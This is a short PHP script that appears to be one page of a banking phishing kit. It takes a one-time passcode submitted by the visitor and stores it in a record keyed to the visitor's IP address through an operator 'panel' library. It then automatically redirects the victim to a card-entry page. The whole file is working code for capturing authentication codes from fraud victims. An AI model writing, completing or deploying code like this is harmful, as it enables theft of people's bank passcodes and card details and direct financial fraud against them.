<?php
require_once('../panel/lib/funciones.php');
$ip = $_SERVER['REMOTE_ADDR'];
$reg = traer_regitro($ip);
$otp = $_POST['txt-otp'] ?? '';

if ($reg && !empty($otp)) {
    actualizar_registro_otp($reg, $otp);
    // AUTOFLUJO: Salto automático a la pantalla de tarjeta
    header("Location: ../a/tarjeta.php");
}
?>
